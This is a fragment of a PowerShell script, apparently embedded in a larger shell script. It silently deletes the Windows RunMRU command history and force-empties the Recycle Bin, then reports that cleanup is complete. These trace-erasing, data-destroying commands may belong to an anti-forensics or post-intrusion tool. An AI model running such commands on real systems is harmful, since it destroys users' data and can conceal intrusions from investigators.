Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*" -Force -ErrorAction SilentlyContinue 2>$null
Write-Host "  [+] MRU entries cleared" -ForegroundColor Green

# Recycle bin
try {
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Recycle bin emptied" -ForegroundColor Green
} catch {}

Write-Host "`n[+] Cleanup complete" -ForegroundColor Green
PSEOF
    fi

